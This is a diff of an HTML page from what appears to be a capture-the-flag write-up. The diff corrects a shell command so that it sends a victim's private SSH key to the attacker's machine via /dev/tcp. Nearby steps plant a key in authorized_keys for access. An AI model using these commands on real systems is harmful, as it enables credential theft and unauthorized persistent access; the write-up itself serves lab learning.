@@ -185,7 +185,7 @@
   Calculate the post's reading time, and display the word count in tooltip
  --><!-- words per minute  --><!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="926 words">
+  title="927 words">
   <em>5 min</em> read</span>
 <!-- page views --></div>
 
@@ -305,7 +305,7 @@ Nmap done: 1 IP address (1 host up) scanned in 99.42 seconds
 <span class="nv">$ </span>ssh-keygen <span class="c"># Create the keys</span>
 <span class="nv">$ </span><span class="nb">cd</span> .ssh/
 <span class="nv">$ </span><span class="nb">cp </span>id_rsa.pub authorized_keys <span class="c"># Enable the key.</span>
-<span class="nv">$ </span><span class="nb">cat </span>id_rsa /dev/tcp/10.10.14.31/443 <span class="c"># Push it to my box</span>
+<span class="nv">$ </span><span class="nb">cat </span>id_rsa <span class="o">&gt;</span> /dev/tcp/10.10.14.31/443 <span class="c"># Push it to my box</span>
 
 <span class="c"># On attacking machine</span>
 <span class="nv">$ </span><span class="nb">chmod </span>600 id_rsa <span class="c"># Required by the ssh client</span>
